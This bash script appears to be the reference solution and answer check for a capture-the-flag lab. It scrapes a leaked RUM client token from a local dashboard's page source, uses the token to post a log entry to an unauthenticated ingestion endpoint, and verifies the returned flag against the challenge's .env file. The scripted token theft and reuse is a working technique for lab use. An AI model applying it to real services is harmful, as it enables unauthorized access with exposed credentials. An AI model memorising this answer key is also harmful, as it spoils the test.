#!/usr/bin/env bash
# ============================================================
# MetricsDashboard (labs09) — reference solution: leaked RUM
# token + unauthenticated log ingestion
#
# Chain: read the RUM client token from the landing page
# source -> ingest one log entry with the token ONLY in the
# required auth field (all other fields benign) -> flag in
# the response.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8089)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8089}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] recovering the RUM token from the landing page source" >&2
TOKEN="$(curl -fsS "$BASE/" | grep -oE 'DD_RUM_TOKEN = "[^"]+"' | head -n1 | cut -d'"' -f2)"
[[ -n "$TOKEN" ]] || { echo "[-] failed: RUM token not found in page source" >&2; exit 1; }

echo "[*] ingesting one entry (token in the auth field only, benign message)" >&2
RESP="$(curl -fsS -X POST "$BASE/api/logs" -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN\",\"message\":\"test entry\"}")"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
